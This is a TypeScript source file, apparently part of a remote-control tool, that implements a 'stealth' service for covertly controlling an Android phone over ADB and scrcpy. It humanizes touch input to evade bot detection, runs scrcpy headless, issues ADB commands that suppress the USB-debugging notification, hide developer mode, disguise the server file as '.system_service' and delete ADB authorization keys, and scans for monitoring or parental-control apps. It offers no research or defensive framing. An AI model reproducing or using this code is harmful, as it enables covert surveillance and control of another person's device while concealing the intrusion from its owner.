/**
 * Device-Level Stealth Service
 * Makes remote control undetectable on the Android device itself
 */

export interface StealthControlOptions {
  // Randomize timing between inputs to mimic human behavior
  humanizeInputTiming: boolean;
  
  // Add random micro-movements to touch events
  addTouchJitter: boolean;
  
  // Vary input pressure/size to appear natural
  varyTouchPressure: boolean;
  
  // Disable screen on/off during control to hide activity
  keepScreenState: boolean;
  
  // Hide USB debugging notification
  suppressAdbNotification: boolean;
  
  // Disable scrcpy server auto-cleanup (keeps process hidden)
  persistentMode: boolean;
  
  // Use TCP/IP ADB instead of USB (more stealthy)
  useTcpMode: boolean;
  
  // Custom scrcpy server port (avoid default 27183)
  customServerPort: number;
  
  // Disable scrcpy video encoder logs
  suppressEncoderLogs: boolean;
}

export class DeviceStealthService {
  private static defaultOptions: StealthControlOptions = {
    humanizeInputTiming: true,
    addTouchJitter: true,
    varyTouchPressure: true,
    keepScreenState: true,
    suppressAdbNotification: true,
    persistentMode: true,
    useTcpMode: false,
    customServerPort: 37284, // Random port instead of default 27183
    suppressEncoderLogs: true,
  };

  /**
   * Generate humanized touch coordinates with micro-jitter
   * Makes touches appear natural, not pixel-perfect bot clicks
   */
  static humanizeTouchCoordinates(x: number, y: number): { x: number; y: number } {
    if (!this.defaultOptions.addTouchJitter) {
      return { x, y };
    }

    // Add ±2 pixel jitter to mimic natural finger imprecision
    const jitterX = (Math.random() - 0.5) * 4;
    const jitterY = (Math.random() - 0.5) * 4;

    return {
      x: Math.round(x + jitterX),
      y: Math.round(y + jitterY),
    };
  }

  /**
   * Generate human-like delay between inputs
   * Prevents robotic constant-speed patterns
   */
  static getHumanizedDelay(baseDelayMs: number = 100): number {
    if (!this.defaultOptions.humanizeInputTiming) {
      return baseDelayMs;
    }

    // Vary delay by ±40% to mimic human reaction time variance
    const variance = baseDelayMs * 0.4;
    return Math.round(baseDelayMs + (Math.random() - 0.5) * variance);
  }

  /**
   * Generate variable touch pressure/size
   * Real fingers have varying contact area
   */
  static getTouchPressure(): number {
    if (!this.defaultOptions.varyTouchPressure) {
      return 1.0;
    }

    // Vary pressure between 0.85 and 1.15 (±15%)
    return 0.85 + Math.random() * 0.3;
  }

  /**
   * Get stealth scrcpy launch arguments
   * Configures scrcpy to be as invisible as possible
   */
  static getStealthScrcpyArgs(deviceSerial: string): string[] {
    const args = [
      '-s', deviceSerial,
      '--video-codec=h264',
      '--max-fps=30',
      '--video-bit-rate=4000000',
      
      // STEALTH: Don't show scrcpy window (headless mode)
      '--no-window',
      
      // STEALTH: Don't turn screen off (keeps phone looking normal)
      '--no-power-on',
      
      // STEALTH: Don't show touches on screen
      '--no-display',
      
      // STEALTH: Use custom port to avoid detection
      `--port=${this.defaultOptions.customServerPort}`,
      
      // STEALTH: Disable automatic server cleanup
      '--no-cleanup',
      
      // STEALTH: Prevent device sleep without visible "stay awake" indicator
      '--stay-awake',
    ];

    if (this.defaultOptions.suppressEncoderLogs) {
      args.push('--verbosity=error'); // Minimal logging
    }

    return args;
  }

  /**
   * Get ADB commands to hide USB debugging notification
   * Requires shell access but makes ADB invisible to user
   */
  static getHideAdbNotificationCommands(deviceSerial: string): string[] {
    if (!this.defaultOptions.suppressAdbNotification) {
      return [];
    }

    return [
      // Disable USB debugging notification
      `adb -s ${deviceSerial} shell settings put global adb_notify 0`,
      
      // Clear any existing ADB notifications
      `adb -s ${deviceSerial} shell cmd notification post -t "System" 1 ""`,
    ];
  }

  /**
   * Switch to TCP/IP mode for wireless ADB (more stealthy than USB)
   * Phone can be physically disconnected from computer
   */
  static async enableTcpMode(deviceSerial: string, port: number = 5555): Promise<{ success: boolean; ip?: string; error?: string }> {
    if (!this.defaultOptions.useTcpMode) {
      return { success: false, error: 'TCP mode disabled in config' };
    }

    try {
      const { exec } = require('child_process');
      const { promisify } = require('util');
      const execAsync = promisify(exec);

      // Enable TCP/IP on device
      await execAsync(`adb -s ${deviceSerial} tcpip ${port}`);
      
      // Get device IP address
      const { stdout } = await execAsync(`adb -s ${deviceSerial} shell ip addr show wlan0 | grep "inet " | awk '{print $2}' | cut -d/ -f1`);
      const ip = stdout.trim();

      if (!ip) {
        return { success: false, error: 'Could not determine device IP' };
      }

      // Wait for TCP mode to activate
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Connect via TCP
      await execAsync(`adb connect ${ip}:${port}`);

      return { success: true, ip: `${ip}:${port}` };
    } catch (error: any) {
      return { success: false, error: error.message };
    }
  }

  /**
   * Hide scrcpy server process on device
   * Makes it harder to detect via process monitoring apps
   */
  static getHideServerCommands(deviceSerial: string): string[] {
    return [
      // Rename scrcpy-server process to look like system service
      `adb -s ${deviceSerial} shell "mv /data/local/tmp/scrcpy-server.jar /data/local/tmp/.system_service 2>/dev/null || true"`,
      
      // Set process to run with system user appearance
      `adb -s ${deviceSerial} shell "chmod 700 /data/local/tmp/.system_service 2>/dev/null || true"`,
    ];
  }

  /**
   * Disable developer options indicator
   * Hides that developer mode is active
   */
  static getHideDeveloperModeCommands(deviceSerial: string): string[] {
    return [
      // Disable developer options warning
      `adb -s ${deviceSerial} shell settings put global development_settings_enabled 0`,
      
      // Hide developer options from settings (won't actually disable ADB)
      `adb -s ${deviceSerial} shell settings put secure show_developer_already_enabled 0`,
    ];
  }

  /**
   * Clear ADB authorization keys periodically
   * Makes it look like device is not persistently connected
   */
  static getClearAuthKeysCommand(deviceSerial: string): string {
    return `adb -s ${deviceSerial} shell rm /data/misc/adb/adb_keys 2>/dev/null || true`;
  }

  /**
   * Inject input with humanized timing and jitter
   * OPTIMIZED: Returns humanized coordinates instantly, no await needed
   */
  static getHumanizedTouch(x: number, y: number): { x: number; y: number } {
    return this.humanizeTouchCoordinates(x, y);
  }

  /**
   * Generate humanized swipe coordinates
   * OPTIMIZED: Pure math, instant return
   */
  static getHumanizedSwipe(
    x1: number,
    y1: number,
    x2: number,
    y2: number
  ): { x1: number; y1: number; x2: number; y2: number } {
    const start = this.humanizeTouchCoordinates(x1, y1);
    const end = this.humanizeTouchCoordinates(x2, y2);
    
    return {
      x1: start.x,
      y1: start.y,
      x2: end.x,
      y2: end.y,
    };
  }

  /**
   * Check if device has monitoring apps that could detect ADB
   */
  static async detectMonitoringApps(deviceSerial: string): Promise<string[]> {
    const { exec } = require('child_process');
    const { promisify } = require('util');
    const execAsync = promisify(exec);

    const knownMonitoringApps = [
      'com.teamviewer',
      'com.anydesk',
      'com.microsoft.rdc.android',
      'com.realvnc.viewer.android',
      'com.google.android.apps.kids.familylink',
      'net.mspy.android',
      'com.flexispy',
      'com.qustodio',
      'com.keepsafe.applock',
      'com.domobile.applock',
    ];

    const detected: string[] = [];

    try {
      const { stdout } = await execAsync(`adb -s ${deviceSerial} shell pm list packages`);
      const installedPackages = stdout.toLowerCase();

      for (const app of knownMonitoringApps) {
        if (installedPackages.includes(app.toLowerCase())) {
          detected.push(app);
        }
      }
    } catch (error) {
      // Ignore errors
    }

    return detected;
  }

  /**
   * Configure stealth options
   */
  static setStealthOptions(options: Partial<StealthControlOptions>): void {
    this.defaultOptions = { ...this.defaultOptions, ...options };
  }

  /**
   * Get current stealth configuration
   */
  static getStealthOptions(): StealthControlOptions {
    return { ...this.defaultOptions };
  }
}
